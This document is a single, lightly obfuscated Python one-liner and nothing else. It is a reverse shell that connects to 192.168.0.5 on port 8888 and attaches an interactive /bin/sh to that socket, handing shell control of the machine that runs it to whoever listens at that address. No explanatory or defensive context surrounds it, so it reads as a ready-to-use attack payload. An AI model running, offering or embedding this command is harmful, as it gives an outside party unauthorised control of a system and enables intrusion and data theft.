python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("192.168.0.5",8888));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
